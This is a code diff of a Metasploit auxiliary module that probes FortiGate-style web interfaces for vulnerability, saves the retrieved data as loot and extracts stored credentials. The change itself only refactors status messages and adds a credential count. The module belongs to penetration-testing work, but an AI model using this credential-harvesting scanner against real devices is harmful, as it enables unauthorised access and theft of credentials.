@@ -59,13 +59,13 @@ class MetasploitModule < Msf::Auxiliary
       })
 
     rescue StandardError => e
-      print_error("Error  - #{@proto}://#{@ip_address}:#{rport}/ - #{e.message}")
+      print_error(message("#{e.message}"))
       return nil
     end
 
     if response && response.code == 200
       if response.body =~ /var fgt_lang/
-        print_good("Target - #{@proto}://#{@ip_address}:#{rport}/ - Vulnerable!")
+        print_good(message('Vulnerable!'))
 
         report_vuln(
           host: @ip_address,
@@ -76,10 +76,14 @@ class MetasploitModule < Msf::Auxiliary
         return response.body if datastore['STORE_CRED'] == true
       end
     elsif response && response.code == 404
-      print_error("Target - #{@proto}://#{@ip_address}:#{rport}/ - NOT Vulnerable!")
+      print_error(message('NOT Vulnerable!'))
     end
 
     return nil
+  end
+
+  def message(msg)
+    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
   def parse_config(chunk)
@@ -138,8 +142,8 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     @proto = (ssl ? 'https' : 'http')
     @ip_address = ip
-    print_status("Trying - #{@proto}://#{@ip_address}:#{rport}/")
 
+    print_status(message('Trying to connect.'))
     data = execute_request
     if !data.nil?
       if datastore['STORE_LOOT']
@@ -150,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
           loot_data = data
         end
         loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
-        print_good("File saved to #{loot_path}")
+        print_good(message("File saved to #{loot_path}"))
       end
 
       if data[72..73] == "\x5F\x01"
@@ -168,9 +172,11 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       rescue NoMethodError
-        print_error("Error  - #{@proto}://#{@ip_address}:#{rport}/ - No data credentials found!")
+        print_error(message('No credential(s) found!'))
+        return
       end
-
+      
+      print_good(message("#{creds.length} credential(s) found!"))
       report_creds(creds)
     end
   end
